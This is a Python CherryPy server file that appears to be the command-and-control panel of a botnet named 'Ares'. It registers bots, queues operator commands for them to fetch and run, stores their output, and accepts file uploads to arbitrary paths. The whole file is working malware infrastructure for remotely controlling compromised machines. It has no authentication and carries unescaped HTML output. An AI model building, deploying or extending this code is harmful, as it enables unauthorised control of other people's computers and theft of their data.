import cherrypy
import sqlite3
import time


def query_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    result = []
    for row in cursor.execute(sql, params):
        result.append(row)
    conn.close()
    return result

def exec_DB(sql, params=()):
    conn = sqlite3.connect('beta.db')
    cursor = conn.cursor()
    cursor.execute(sql, params)
    conn.commit()
    conn.close()

class Main(object):
    @cherrypy.expose
    def index(self):
        return """
        Welcome to Ares.<br>
        <a href="/cnc/">Bot List</a>
        """

class CNC(object):
    @cherrypy.expose
    def index(self):
        output = ""
        bot_list = query_DB("SELECT * FROM bots ORDER BY lastonline DESC")
        for bot in bot_list:
            output += '<a href="/cnc/bot?botid=%s">%s <br>(Last Online on %s)</a><br><br />' \
            % (bot[0], bot[0], time.ctime(bot[1]))
        return output

    @cherrypy.expose
    def bot(self, botid):
        with open("bot.html", "r") as f:
            html = f.read()
            html = html.replace("{{botid}}", botid)
            return html


class API(object):
    """
    ********************************************
    Client commands:

    /api/pop?botid=<bot_id>
    Gets next command + command id or empty if nothing to do

    /api/report?botid=<bot_id>&output=<output>
    Give output of command

    ********************************************
    Server commands:

    /api/push?botid=<bot_id>&cmd=<cmd>
    Pushes a command to the waiting list of the bot

    /api/stdout?bot_id=<bot_id>
    Shows the command history of the bot
    
    """

    @cherrypy.expose
    def pop(self, botid):
        bot = query_DB("SELECT * FROM bots WHERE name=?", (botid,))
        if not bot:
            exec_DB("INSERT INTO bots VALUES (?, ?)", (botid, time.time()))
        else:
            exec_DB("UPDATE bots SET lastonline=? where name=?", (time.time(), botid))
        cmd = query_DB("SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date", (botid, 0))
        if cmd:
            exec_DB("UPDATE commands SET sent=? where id=?", (1, cmd[0][0]))
            return cmd[0][2]
        else:
            return ""

    @cherrypy.expose
    def report(self, botid, output):
        exec_DB("INSERT INTO output VALUES (?, ?, ?, ?)", (None, time.time(), output, botid))

    @cherrypy.expose
    def push(self, botid, cmd):
        exec_DB("INSERT INTO commands VALUES (?, ?, ?, ?, ?)", (None, time.time(), cmd, False, botid))
    
    @cherrypy.expose
    def stdout(self, botid):
        output = ""
        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
        for entry in bot_output:
            output += "<pre>%s</pre><br><br>" % (entry[2],)
        return output

    @cherrypy.expose
    def upload(self, botid, src, uploaded):
        outfile = open(src, 'wb')
        while True:
            data = uploaded.file.read(8192)
            if not data:
                break
            outfile.write(data)
        outfile.close()
        return ""


def main():
    cherrypy.config.update({'server.socket_host': 'localhost',
                            'server.socket_port': 80,
                           })
    app = Main()
    app.api = API()
    app.cnc = CNC()
    cherrypy.quickstart(app)


if __name__ == "__main__":
    main()
